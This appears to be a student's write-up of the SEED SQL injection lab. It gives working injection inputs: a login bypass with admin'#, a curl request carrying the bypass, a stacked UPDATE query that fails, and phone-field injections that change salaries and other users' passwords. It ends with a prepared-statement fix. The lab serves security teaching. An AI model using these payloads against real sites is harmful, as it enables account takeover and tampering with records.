# SQL Injection

## Task 1: Get Familiar with SQL Statements

## Task 2: SQL Injection Attack on SELECT Statement

### Task 2.1: SQL Injection Attack from webpage.

Username: `admin'#`

Password: 随意

### Task 2.2: SQL Injection Attack from command line.

`curl http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password=1`

### Task 2.3: Append a new SQL statement.

Username: `1';UPDATE credential SET nickname='aalice' where eid=10000#`

Password: 随意

报错：

```
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UPDATE credential SET nickname='aalice' where eid=10000#' and Password='356a192b' at line 3]\n
```

## Task 3: SQL Injection Attack on UPDATE Statement

### Task 3.1: Modify your own salary.

在Phone number一栏输入`', salary='10000000`。

### Task 3.2: Modify other people’ salary.

在Phone number一栏输入`', salary='1' where EID=20000#`。

### Task 3.3: Modify other people’ password.

在Phone number一栏输入`' where EID=20000#`

Password一栏输入`123`

## Task 4: Countermeasure — Prepared Statement

```shell
# nano /var/www/SQL_Injection/defense/unsafe.php
```

```php
[...]
// do the query
$stmt = $conn->prepare("SELECT id, name, eid, salary, ssn
                        FROM credential
                        WHERE name= ? and Password= ?");
$stmt->bind_param("ss", $input_uname, $hashed_pwd);
$stmt->execute();
$stmt->bind_result($id, $name, $eid, $salary, $ssn);
$stmt->fetch();

// close the sql connection
$conn->close();
[...]
```

